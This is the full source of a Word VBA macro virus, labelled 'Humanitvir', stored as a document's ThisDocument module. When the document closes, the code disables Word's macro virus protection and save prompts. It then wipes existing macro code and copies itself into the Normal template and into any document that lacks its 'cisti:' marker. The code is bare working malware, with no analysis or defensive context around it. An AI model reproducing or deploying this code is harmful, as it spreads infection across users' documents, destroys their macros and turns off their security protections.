   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
   Rem Humanitvir
   cisti:
   Application.EnableCancelKey = Not -1
   With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
   Set n = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
   Set d = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
   If n.Lines(4, 1) <> "cisti:" Then
   Do Until n.CountOfLines = 0
   n.DeleteLines 1, 1
   Loop
   For a = 1 To d.CountOfLines
   n.InsertLines a, d.Lines(a, 1)
   Next a
   End If
   If d.Lines(4, 1) <> "cisti:" Then
   Do Until d.CountOfLines = 0
   d.DeleteLines 1, 1
   Loop
   For a = 1 To n.CountOfLines
   d.InsertLines a, n.Lines(a, 1)
   Next a
   End If
   End Sub
